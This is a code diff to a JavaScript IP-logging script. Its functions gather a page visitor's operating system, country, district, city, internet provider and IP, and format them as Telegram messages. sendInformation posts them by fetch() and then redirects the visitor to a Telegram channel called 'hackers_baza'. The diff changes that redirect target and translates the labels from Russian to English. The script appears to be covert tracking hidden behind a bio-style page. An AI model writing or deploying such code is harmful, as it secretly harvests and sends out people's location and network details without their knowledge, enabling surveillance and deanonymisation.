@@ -24,17 +24,17 @@ function sendInformation() {
     
     fetch(url, options)
     .then(response => response.text())
-    .then(result => location="https://saikono-telegram.github.io/mybio/")
+    .then(result => location="https://t.me/hackers_baza")
     .catch(error => console.log("error", error));
 }
 
 function IPLocation(location) {
     let json = JSON.parse(location);
 
-    var os = "🔻 <b>OС:</b> <code>" + platform.os + "</code>";
-    var country = "🔻 <b>Страна:</b> <code>" + json.location.data.country + "</code>";
-    var federal = "🔻 <b>Округ:</b> <code>" + json.location.data.federal_district + "</code>";
-    var city = "🔻 <b>Город:</b> <code>" + json.location.unrestricted_value + "</code>";
+    var os = "🔻 <b>OS:</b> <code>" + platform.os + "</code>";
+    var country = "🔻 <b>Country:</b> <code>" + json.location.data.country + "</code>";
+    var federal = "🔻 <b>Federal:</b> <code>" + json.location.data.federal_district + "</code>";
+    var city = "🔻 <b>City:</b> <code>" + json.location.unrestricted_value + "</code>";
 
     logs.push(os, country, federal, city);
 }
@@ -44,12 +44,12 @@ function IPProvider(information) {
 
     if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i
     .test(navigator.userAgent)) {
-        var provider = "🔻 <b>Провайдер:</b> <code>" + text[1].replace("netname", "").trim() + "</code>";
-        var ip = "🔻 <b>Провайдер IP:</b> <code>" + text[37].replace("descr", "").trim() + "</code>";
+        var provider = "🔻 <b>Provider:</b> <code>" + text[1].replace("netname", "").trim() + "</code>";
+        var ip = "🔻 <b>Provider IP:</b> <code>" + text[37].replace("descr", "").trim() + "</code>";
     } 
     else {
-        var provider = "🔻 <b>Провайдер:</b> <code>" + text[2].replace("descr", "").trim() + "</code>";
-        var ip = "🔻 <b>Провайдер IP:</b> <code>" + text[33].replace("route", "").trim() + "</code>";
+        var provider = "🔻 <b>Provider:</b> <code>" + text[2].replace("descr", "").trim() + "</code>";
+        var ip = "🔻 <b>Provider IP:</b> <code>" + text[33].replace("route", "").trim() + "</code>";
     }
 
     logs.push(provider, ip);
